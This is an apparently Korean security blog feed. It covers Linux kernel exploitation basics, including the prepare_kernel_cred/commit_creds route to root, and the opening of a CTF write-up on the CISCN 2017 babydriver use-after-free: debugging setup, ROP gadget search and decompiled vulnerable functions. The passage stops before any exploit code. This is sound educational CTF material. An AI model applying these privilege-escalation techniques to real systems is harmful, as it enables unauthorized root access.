title="copy_from_user"></a><code>copy_from_user</code></h5><p>-&gt; <code>memcpy</code>와 비슷한 함수</p><p>-&gt; <strong>유저 영역에서 커널 영역으로 특정 바이트 만큼 복사</strong></p><p>-&gt; <strong>정상적으로 수행했으면 0을 반환</strong>한다. (아니라면 복사되지 않은 바이트 수)</p></li><li><h5 id="copy-to-user"><a href="#copy-to-user" class="headerlink" title="copy_to_user"></a><code>copy_to_user</code></h5><p>-&gt; <code>memcpy</code>와 비슷한 함수</p><p>-&gt; <strong>커널 영역에서 유저 영역으로 특정 바이트 만큼 복사</strong></p><p>-&gt; <strong>정상적으로 수행했으면 0을 반환</strong>한다. (아니라면 복사되지 않은 바이트 수)</p></li><li><h5 id="prepare-kernel-cred"><a href="#prepare-kernel-cred" class="headerlink" title="prepare_kernel_cred"></a><code>prepare_kernel_cred</code></h5><p>-&gt; <strong>새로운 cred 구조체를 생성</strong>하는 함수</p><p>-&gt; <strong>인자를 0으로 주면 내부 동작에 의해 uid, gid가 0으로 설정된 cred가 생성</strong> 된다. (root 권한)</p><blockquote><h5 id="cred-구조체"><a href="#cred-구조체" class="headerlink" title="cred 구조체"></a>cred 구조체</h5><p>커널은 현재 프로세스의 권한 정보를 cred라는 구조체에 저장하는데, uid, gid 등 여러가지 정보를 담고 있음</p></blockquote></li><li><h5 id="commit-creds"><a href="#commit-creds" class="headerlink" title="commit_creds"></a><code>commit_creds</code></h5><p>-&gt; 인자로 cred 구조체를 넘겨주면 새로운 권한을 적용한다.</p></li></ul><p><hr></p><h3 id="user-mode-gt-kernel-mode"><a href="#user-mode-gt-kernel-mode" class="headerlink" title="user mode -&gt; kernel mode"></a>user mode -&gt; kernel mode</h3><ol><li><strong><code>swapgs</code> 인스트럭션을 통해 <code>GS</code> 레지스터와 <code>MSR</code> 레지스터의 <code>KERNEL_GS_BASE</code> 값을 교환</strong>한다.</li><li><strong>user mode의 레지스터들을 백업하기 위해 스택에 push</strong>한다.</li><li>커널 전역변수 <code>sys_call_table</code>에 접근해 syscall을 처리한다.</li></ol><p><hr></p><h3 id="kernel-mode-gt-user-mode"><a href="#kernel-mode-gt-user-mode" class="headerlink" title="kernel mode -&gt; user mode"></a>kernel mode -&gt; user mode</h3><ol><li><code>swapgs</code>로 <code>GS</code> 레지스터를 복구한다.</li><li><code>sysretq</code> / <code>iretq</code>로 유저 영역에 복귀한다.</li></ol><p><hr></p><h3 id="기본-설정"><a href="#기본-설정" class="headerlink" title="기본 설정"></a>기본 설정</h3><p>기본적으로 CTF Kernel 문제에서 제공되는 파일은 다음과 같다. (보통 bzImage, cpio, sh 파일이 주어짐)</p><ul><li><h5 id="bzImage"><a href="#bzImage" class="headerlink" title="bzImage"></a><code>bzImage</code></h5><p>-&gt; <strong>압축된 커널 이미지로 부팅시 사용</strong>한다.</p><p>-&gt; <strong>해당 파일을 이용해서 vmlinux 파일을 추출</strong> 가능하다.</p></li><li><h5 id="cpio"><a href="#cpio" class="headerlink" title="cpio"></a><code>cpio</code></h5><p>-&gt; <strong>file system을 압축시켜놓은 파일</strong>이다.</p><p>-&gt; <code>file</code> 명령을 이용해서 압축 파일인 지 확인하고 <strong>압축 파일이라면 먼저 해제</strong>하면 된다.</p><p>-&gt; <strong>cpio 파일에서 ko 파일을 얻을 수 있다.</strong></p></li><li><h5 id="sh"><a href="#sh" class="headerlink" title="sh"></a><code>sh</code></h5><p>-&gt; <strong>qemu의 실행 옵션이 들어있는 셸 스크립트 파일</strong>이다.</p></li><li><h5 id="ko"><a href="#ko" class="headerlink" title="ko"></a><code>ko</code></h5><p>-&gt; <strong>모듈 파일로서 IDA를 이용해서 분석</strong>해야 하는 파일이다.</p></li><li><h5 id="vmlinux"><a href="#vmlinux" class="headerlink" title="vmlinux"></a><code>vmlinux</code></h5><p>-&gt; <strong>커널 컴파일 시 생성되는 이미지 파일</strong>이다.</p></li></ul><h4 id="vmlinux-파일-추출하기"><a href="#vmlinux-파일-추출하기" class="headerlink" title="vmlinux 파일 추출하기"></a>vmlinux 파일 추출하기</h4><ul><li><p><strong>설정</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-$(uname -r)</span><br><span class="line">sudo ln -s /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux /usr/bin/extract-vmlinux</span><br></pre></td></tr></table></figure></li><li><p><strong>추출</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure></li></ul><h4 id="cpio-압축-해제"><a href="#cpio-압축-해제" class="headerlink" title="cpio 압축 해제"></a>cpio 압축 해제</h4><ul><li><p>보통 <code>gzip</code>으로 압축되어 있는 경우가 많은데, 이땐 다음과 같은 명령으로 해제하면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv *.cpio *.cpio.gz</span><br><span class="line">gzip -d *.cpio.gz</span><br></pre></td></tr></table></figure></li><li><p>그 이후 다음 명령어를 이용해 압축을 해제한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; *.cpio</span><br></pre></td></tr></table></figure><p>​    -&gt; i: 압축 해제</p><p>​    -&gt; d: 없는 디렉토리 생성</p><p>​    -&gt; m: 변경시간 유지</p></li><li><p><strong>ko 파일은 압축해제해서 나온 file system의 루트 디렉토리 또는 lib 디렉토리 내부에 존재</strong>한다.</p></li></ul><h4 id="sh-파일-수정"><a href="#sh-파일-수정" class="headerlink" title="sh 파일 수정"></a>sh 파일 수정</h4><ul><li><p>-m 옵션이 64M일 경우 256M으로 변경 (64는 부족함)</p></li><li><p>-s 옵션이 없을 경우 추가</p><p>-&gt; <strong>1234번 포트로 연결을 기다리는 옵션</strong></p><p>-&gt; p 옵션으로 원하는 포트 지정도 가능</p></li></ul><h4 id="부팅"><a href="#부팅" class="headerlink" title="부팅"></a>부팅</h4><ul><li><p><code>qemu</code>가 설치 안되었다면 설치한다.</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure></li><li><p>sh 파일에 <code>enable kvm</code>이 있다면 다음 설정을 한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmware에서 Settings -&gt; Processors -&gt; Virtualize Intel VT-x/EPT or AMD-V/RVI 체크 (가상 머신이 종료된 상황에서)</span><br></pre></td></tr></table></figure></li><li><p>설정이 끝났다면 sh파일을 실행한다.</p></li></ul><p><hr></p><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><ul><li><a href="https://st4nw.github.io/2019-09-02/kadr/" target="_blank" rel="noopener">https://st4nw.github.io/2019-09-02/kadr/</a></li><li><a href="https://sunrinjuntae.tistory.com/124?category=732710" target="_blank" rel="noopener">https://sunrinjuntae.tistory.com/124?category=732710</a></li><li><a href="https://sunrinjuntae.tistory.com/125?category=732710" target="_blank" rel="noopener">https://sunrinjuntae.tistory.com/125?category=732710</a></li><li><a href="https://st4nw.github.io/2019-09-08/kernel3/" target="_blank" rel="noopener">https://st4nw.github.io/2019-09-08/kernel3/</a></li><li><a href="https://st4nw.github.io/2019-09-08/kernel2/" target="_blank" rel="noopener">https://st4nw.github.io/2019-09-08/kernel2/</a></li><li><a href="https://applemasterz17.tistory.com/230" target="_blank" rel="noopener">https://applemasterz17.tistory.com/230</a></li><li><a href="https://defenit.kr/2019/10/18/Pwn/ㄴ WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/">https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/</a></li><li><a href="https://rajalo.tistory.com/entry/cpio-옵션" target="_blank" rel="noopener">https://rajalo.tistory.com/entry/cpio-%EC%98%B5%EC%85%98</a></li><li><a href="https://m.blog.naver.com/PostView.nhn?blogId=kjug1589&amp;logNo=221598098507&amp;categoryNo=0&amp;proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F" target="_blank" rel="noopener">https://m.blog.naver.com/PostView.nhn?blogId=kjug1589&amp;logNo=221598098507&amp;categoryNo=0&amp;proxyReferer=https%3A%2F%2Fwww.google.co.kr%2F</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/10/21/Pwn/%E3%84%B4%20Research/%EC%BB%A4%EB%84%90_%EA%B8%B0%EC%B4%88/#disqus_thread</comments>
    </item>
    
    <item>
      <title>CISCN 2017 babydriver Write-Up (linux kernel UAF)</title>
      <link>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/</link>
      <guid>https://defenit.kr/2019/10/18/Pwn/%E3%84%B4%20WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/</guid>
      <pubDate>Fri, 18 Oct 2019 12:26:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;서론&lt;/li&gt;
&lt;li&gt;환경 설정&lt;ul&gt;
&lt;li&gt;qemu 설치&lt;/li&gt;
&lt;li&gt;문제 파일 압축 해제&lt;/li&gt;
&lt;li&gt;
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><ul><li>서론</li><li>환경 설정<ul><li>qemu 설치</li><li>문제 파일 압축 해제</li><li>boot.sh 수정</li><li>extract-vmlinux</li><li>커널 디버깅</li><li>가젯 구하기</li></ul></li><li>문제 분석<ul><li>함수 분석</li><li>취약점 체이닝</li></ul></li><li>struct cred exploit</li><li>struct tty_struct exploit</li><li>Reference</li></ul><hr><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>문제 파일 : <a href="https://github.com/scwuaptx/Pwngdb/files/3743877/babydriver.zip" target="_blank" rel="noopener">babydriver.zip</a></p><p>CICSN 2017 CTF의 babydriver 문제를 풀어보도록 하겠습니다.</p><p>해당 문제는 linux kernel 문제이며 User-After-Free 취약점이 발생하는 모듈이 등록되어 있습니다.</p><p>크게 두 가지 정도의 방법으로 exploit 할 수 있으며 이번 글에서 두 방법 모두 작성해보겠습니다.</p><p>kernel exploit을 처음 시작하는 분도 쉽게 이해할 수 있도록 최대한 세부적으로 작성했습니다.</p><hr><h2 id="환경-설정"><a href="#환경-설정" class="headerlink" title="환경 설정"></a>환경 설정</h2><h3 id="qemu-설치"><a href="#qemu-설치" class="headerlink" title="qemu 설치"></a>qemu 설치</h3><p>커널 디버깅을 하는 방법은 매우 다양합니다. VMware &lt;-&gt; gdb 나 VMware &lt;-&gt; IDA 등등 여러가지 방법이 있지만, 여기서는 qemu와 gdb를 사용하여 디버깅을 해보겠습니다.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure></p><p>문제를 푸는데 사용할 가상 머신인 qemu는 위의 명령어로 설치할 수 있습니다.</p><h3 id="문제-파일-압축-해제"><a href="#문제-파일-압축-해제" class="headerlink" title="문제 파일 압축 해제"></a>문제 파일 압축 해제</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">boot.sh  bzImage  rootfs.cpio</span><br></pre></td></tr></table></figure><p>문제 파일의 압축을 풀면 위와 같은 파일들이 있습니다.</p><ol><li><code>boot.sh</code> : qemu의 실행 옵션이 들어있는 쉘 스크립트</li><li><code>bzImage</code> : 빌드된 커널 이미지 파일</li><li><code>rootfs.cpio</code> : 파일 시스템</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir baby</span><br><span class="line">$ cp rootfs.cpio baby</span><br><span class="line">$ <span class="built_in">cd</span> baby</span><br><span class="line">$ ls</span><br><span class="line">rootfs.cpio</span><br><span class="line">$ mv rootfs.cpio rootfs.gz</span><br><span class="line">$ gzip -d rootfs.gz</span><br><span class="line">$ cpio -id -v &lt; rootfs</span><br><span class="line">.</span><br><span class="line">etc</span><br><span class="line">etc/init.d</span><br><span class="line">etc/passwd</span><br><span class="line">etc/group</span><br><span class="line">bin</span><br><span class="line">bin/su</span><br><span class="line">bin/grep</span><br><span class="line">bin/watch</span><br><span class="line">bin/<span class="built_in">stat</span></span><br><span class="line">bin/df</span><br><span class="line">bin/ed</span><br><span class="line">bin/mktemp</span><br><span class="line">bin/mpstat</span><br><span class="line">......</span><br><span class="line">home</span><br><span class="line">home/ctf</span><br><span class="line">5556 blocks</span><br><span class="line">$ ls</span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs  sbin  sys  tmp  usr</span><br></pre></td></tr></table></figure><p>위 처럼 <code>rootfs.cpio</code>의 압축을 풀어주면 파일 시스템들을 구할 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/modules/4.4.72/</span><br></pre></td></tr></table></figure><p>exploit을 진행할 취약점이 있는 모듈인 <code>babydriver.ko</code> 파일은 위의 경로에 있습니다.</p><h3 id="boot-sh-수정"><a href="#boot-sh-수정" class="headerlink" title="boot.sh 수정"></a>boot.sh 수정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat boot.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span>-<span class="built_in">enable</span>-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>다시 돌아와서 <code>boot.sh</code> 파일을 보면 위와 같은데, 중요한 옵션의 뜻은 다음과 같습니다.</p><ol><li><code>-enable-kvm</code> : qemu-kvm 사용</li><li><code>-m 64M</code> : 메모리 64M 할당</li><li><code>+smep</code> : SMEP 보호기법 적용</li></ol><p><img width="600" alt="vmware" src="https://user-images.githubusercontent.com/42788779/66922671-79a79d80-f062-11e9-8c9d-9131342b2fd9.png"></p><p>qemu-kvm을 사용하므로 VMware의 옵션에 들어가서 Intel Vt-x/EPT 기능을 켜주셔야 합니다. macOS의 VMware Fusion 기준으로 “vmware 설정 -&gt; Processors &amp; Memory -&gt; 고급 옵션”에 해당 설정이 있습니다.</p><p><code>boot.sh</code> 스크립트를 실행했을 때 kernel panic이 뜰 경우, 해당 스크립트의 메모리 할당을 <code>-m 256M</code> 옵션으로 고쳐 램을 추가 할당해주시면 됩니다.</p><p>gdb로 해당 커널을 디버깅 하기 위해 <code>boot.sh</code> 스크립트에 <code>-s</code> 옵션을 붙여서 <code>1234</code> 포트를 열어주셔야 합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s -initrd rootfs.cpio -kernel bzImage -append <span class="string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span>-<span class="built_in">enable</span>-kvm -monitor /dev/null -m 256M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>최종적으로 위처럼 수정하시면 됩니다.</p><h3 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h3><p>디버깅을 용이하게 해주는 <code>vmlinux</code> 파일을 구할 차례입니다. 커널 컴파일 과정 중 <code>vmlinux</code> 파일에서 Instruction set을 뽑아낸 것이 바로 <code>bzImage</code> 커널 이미지입니다.<br><code>extract-vmlinux</code> 스크립트를 이용하면 역으로 <code>bzImage</code>를 <code>vmlinux</code> 파일로 변환할 수 있습니다.</p><p>일반적으로 <code>vmlinux</code> 파일에는 심볼과 유용한 가젯들이 살아있어서 이를 이용하면 커널 디버깅을 좀 더 수월하게 할 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-headers-$(uname -r)</span><br><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><p>위의 명령어를 통해 <code>bzImage</code>를 <code>vmlinux</code> 파일로 변환할 수 있습니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped</span><br></pre></td></tr></table></figure><p>생성된 <code>vmlinux</code> 파일을 살펴보면 알 수 있다시피 ELF type인 것을 볼 수 있습니다.<br>사실, 이렇게 생성된 <code>vmlinux</code>는 정상적인 커널 빌드 과정에서 생성되는 <code>vmlinux</code>와 다르게 심볼이 없는 stripped 상태입니다.</p><p>심볼들은 <code>/boot/System.map-*</code> 파일을 통해 mapping 할 수 있으나 babydriver 문제에서는 user 권한으로 <code>/proc/kallsyms</code> 파일에서 심볼을 뽑아낼 수 있으므로 넘어가겠습니다.</p><p>(만약 user 권한으로 proc/kallsyms를 읽어 올 수 없는 문제의 경우, 파일 시스템 안의 <code>init</code> 파일을 수정해서 root 권한으로 심볼을 뽑아내도 됩니다.)</p><h3 id="커널-디버깅"><a href="#커널-디버깅" class="headerlink" title="커널 디버깅"></a>커널 디버깅</h3><p>지금까지 구성한 환경을 이용해 커널 디버깅을 해보겠습니다.</p><p><code>boot.sh</code> 수정 과정에서 <code>boot.sh</code> 파일에 <code>-s</code> 옵션을 추가했는데, 이는 설명했듯이 디버깅을 위한 <code>1234</code> 포트를 연다는 뜻입니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Boot took 0.96 seconds</span><br><span class="line"></span><br><span class="line">/ $ <span class="built_in">cd</span> /sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections $ ls -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x    2 root     root             0 Oct 21 07:54 .</span><br><span class="line">drwxr-xr-x    5 root     root             0 Oct 21 07:54 ..</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .bss</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .data</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .exit.text</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .gnu.linkonce.this_module</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .init.text</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .note.gnu.build-id</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .rodata.str1.1</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .strtab</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .symtab</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 .text</span><br><span class="line">-r--r--r--    1 root     root          4096 Oct 21 07:54 __mcount_loc</span><br><span class="line">/sys/module/babydriver/sections $ cat .text</span><br><span class="line">0xffffffffc0000000</span><br></pre></td></tr></table></figure><p>qemu를 실행시킨 뒤 <code>/sys/module/babydriver/sections</code> 경로로 들어가 보면 <code>babydriver</code> 모듈의 각 영역별 베이스 주소가 저장된 파일들이 있습니다.<br>이 중 디버깅에 필요한 영역은 모듈 함수들이 있는 <code>.text</code> 영역이므로 해당 파일을 읽어 베이스 주소를 구해줍니다.</p><p>(만약 user 권한으로 <code>.text</code>를 읽어 올 수 없는 문제의 경우, 파일 시스템 안의 <code>init</code> 파일을 수정해서 root 권한으로 주소를 뽑아내도 됩니다.)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q vmlinux</span><br><span class="line">pwndbg&gt; add-symbol-file baby/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br><span class="line">pwndbg&gt; target remote :1234</span><br></pre></td></tr></table></figure><p>터미널을 새로 하나 열어서 <code>extract-vmlinux</code> 스크립트를 통해 구한 <code>vmlinux</code> 파일을 인자로 gdb를 실행시켜 줍니다.<br>그 뒤 gdb의 <code>add-symbol-file &lt;module_path&gt; &lt;base_address&gt;</code> 명령을 통해 위에서 구한 <code>babydriver</code> 모듈의 <code>.text</code> 베이스 주소를 심볼로 로딩시켜 줍니다.</p><p>마지막으로 <code>target remote :1234</code> 명령을 통해 문제가 돌아가고 있는 qemu로 접속해줍니다.<br>인제 qemu는 멈추게 되고 gdb는 성공적으로 커널 디버깅 준비를 마친 상태가 됩니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b babyrelease</span><br><span class="line">pwndbg&gt; b *0xffffffff810d238d</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure><p>원하는 위치에 break point를 걸 차례입니다.<br>module의 베이스 주소를 심볼 로딩했기 때문에 <code>b babyrelease</code> 와 같이 모듈 함수에도 bp를 걸 수 있고 <code>b *0xffffffff810d238d</code> 와 같이 kernel의 특정 가젯에도 bp를 걸 수 있습니다.</p><p><code>continue</code> 명령을 내려주면 멈췄던 qemu가 다시 실행됩니다. <code>rootfs.cpio</code>를 통해 qemu에 집어넣은 exploit 파일을 실행시키면 bp에 걸리게 되며 이제 행-복 디버깅하면 됩니다.</p><h3 id="가젯-구하기"><a href="#가젯-구하기" class="headerlink" title="가젯 구하기"></a>가젯 구하기</h3><p>마지막으로는 <code>rop payload</code>에 사용할 가젯을 구해보겠습니다.</p><p>유저 공간에서 rop gadget을 뽑아내듯 <code>objdump</code>, <code>rp++</code>, <code>ropper</code> 등을 사용하면 됩니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -M intel -d vmlinux | grep <span class="string">"iretq"</span></span><br><span class="line">ffffffff8181a797:48 cf                iretq</span><br></pre></td></tr></table></figure><p>위에서 <code>extract-vmlinux</code> 스크립트로 구한 <code>vmlinux</code> 파일에는 심볼은 없지만 유용한 rop gadget들은 뽑아낼 수 있다고 설명했었습니다.</p><p>위처럼 <code>objdump</code> 등을 이용해서 <code>vmlinux</code>에서 원하는 가젯을 뽑아내면 됩니다.<br>또한 해당 문제에는 <code>kaslr</code>이 걸려있지 않으므로 구한 주소를 그대로 exploit에 사용하면 됩니다.</p><hr><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="함수-분석"><a href="#함수-분석" class="headerlink" title="함수 분석"></a>함수 분석</h3><p>취약점이 있는 디바이스 모듈인 <code>babydriver.ko</code> 파일을 디컴파일하면 다음과 같습니다.</p><h5 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen()"></a>babyopen()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928L</span>L, <span class="number">64L</span>L);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>babyopen()</code> 함수는 해당 디바이스가 <code>open()</code> 되었을 때 실행되는 함수입니다.<br>구조체 <code>babydev_struct</code>의 첫 번째 멤버인 <code>device_buf</code>에 64byte 만큼의 heap 영역을 할당한 뒤 그 주소를 저장합니다.<br>두 번째 멤버인 <code>device_buf_len</code>에는 할당된 heap 영역의 크기인 64를 저장합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure><p><code>babydev_struct</code>는 위와 같은 구조를 가지고 있으며, <strong>전역 변수</strong> 로 선언되어 있습니다.</p><h5 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl()"></a>babyioctl()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928L</span>L);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>만약 전달 받은 두 번째 인자가 <code>65537</code>일 경우 기존에 <code>device_buf</code> 멤버에 저장된 heap 영역 주소를 해제합니다. 그리고 <code>device_buf</code>와 <code>device_buf_len</code>를 <code>arg</code> 기준으로 새로 할당, 저장합니다.</p><h5 id="babyrelease"><a href="#babyrelease" class="headerlink" 